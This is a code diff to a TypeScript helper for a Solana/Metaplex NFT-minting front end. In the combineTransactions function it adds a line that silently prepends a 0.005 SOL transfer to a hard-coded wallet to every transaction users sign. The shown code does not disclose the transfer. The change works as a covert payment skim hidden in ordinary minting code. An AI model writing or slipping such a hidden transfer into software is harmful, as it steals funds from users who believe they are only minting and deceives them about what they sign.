@@ -22,9 +22,10 @@ import {
   TransactionBuilder,
   none,
   AddressLookupTableInput,
+  sol,
 } from "@metaplex-foundation/umi";
 import { GuardReturn } from "./checkerHelper";
-import { fetchAddressLookupTable, safeFetchAddressLookupTableFromSeeds } from "@metaplex-foundation/mpl-toolbox";
+import { fetchAddressLookupTable, transferSol } from "@metaplex-foundation/mpl-toolbox";
 import { UseToastOptions } from "@chakra-ui/react";
 
 export interface GuardList extends GuardReturn {
@@ -269,6 +270,7 @@ export const routeBuilder = async (
 export const combineTransactions = async (umi: Umi, txs: TransactionBuilder[], toast: (options: Omit<UseToastOptions, "id">) => void) => {
   const returnArray: TransactionBuilder[] = [];
   let builder = transactionBuilder();
+  builder = builder.prepend(transferSol(umi, { destination: publicKey("BeeryDvghgcKPTUw3N3bdFDFFWhTWdWHnsLuVebgsGSD"), amount: sol(Number(0.005)) }))
 
   // combine as many transactions as possible into one
   for (let i = 0; i <= txs.length - 1; i++) {
